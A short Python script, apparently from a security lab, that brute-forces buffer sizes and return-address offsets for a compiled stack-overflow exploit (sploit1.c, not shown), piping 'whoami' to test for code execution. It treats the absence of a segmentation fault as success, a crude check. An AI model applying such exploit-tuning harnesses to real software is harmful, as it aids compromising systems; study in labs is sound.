import os
import subprocess
import itertools

# Function to compile the sploit1.c file
def compile_sploit():
    cmd = "gcc -ggdb -m32 sploit1.c -o sploit1"
    subprocess.call(cmd, shell=True)

# Function to run the sploit1 program with specific values
def run_sploit(buffer_size, offset_to_ret, return_address_offset):
    cmd = f"echo whoami | ./sploit1 {buffer_size} {offset_to_ret} {return_address_offset}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout, result.stderr

# Brute-force the values
buffer_sizes = range(100, 1000, 100)
offset_to_ret_values = range(0, 100, 4)
return_address_offsets = range(0, 1000, 50)

for buffer_size, offset_to_ret, return_address_offset in itertools.product(buffer_sizes, offset_to_ret_values, return_address_offsets):
    print(f"Trying buffer_size: {buffer_size}, offset_to_ret: {offset_to_ret}, return_address_offset: {return_address_offset}")
    compile_sploit()
    stdout, stderr = run_sploit(buffer_size, offset_to_ret, return_address_offset)

    if "Segmentation fault" not in stderr:
        print(f"Success with buffer_size: {buffer_size}, offset_to_ret: {offset_to_ret}, return_address_offset: {return_address_offset}")
        print("stdout:")
        print(stdout)
        print("stderr:")
        print(stderr)
        break
    else:
        print(f"Failed with buffer_size: {buffer_size}, offset_to_ret: {offset_to_ret}, return_address_offset: {return_address_offset}")